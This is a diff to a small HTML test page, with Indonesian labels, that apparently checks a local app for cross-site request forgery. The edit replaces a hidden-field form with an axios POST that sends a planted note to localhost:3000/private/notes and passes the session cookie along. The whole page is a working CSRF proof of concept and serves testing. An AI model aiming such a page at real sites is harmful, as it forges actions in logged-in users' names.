@@ -3,7 +3,8 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CSRF Form post Test</title>
+    <title>CSRF Test</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
       body {
         display: flex;
@@ -21,14 +22,30 @@
     </style>
   </head>
   <body>
-    <form
-      id="csrfForm"
-      action="http://localhost:3000/private/notes"
-      method="POST"
-    >
-      <input type="hidden" name="title" value="ini hacker" />
-      <input type="hidden" name="description" value="wkwkwk" />
-      <button type="submit">Kirim CSRF (via Form)</button>
-    </form>
+    <button onclick="sendRequest()">Tekan untuk Kirim CSRF</button>
+
+    <script>
+      function sendRequest() {
+        axios
+          .post(
+            "http://localhost:3000/private/notes",
+            {
+              title: "ini hacker",
+              description: "wkwkkw",
+            },
+            {
+              withCredentials: true, // wajib agar cookie session ikut terkirim
+            }
+          )
+          .then((response) => {
+            alert("Berhasil:\n" + JSON.stringify(response.data));
+            console.log(response);
+          })
+          .catch((error) => {
+            alert("Gagal:\n" + error);
+            console.error(error);
+          });
+      }
+    </script>
   </body>
 </html>
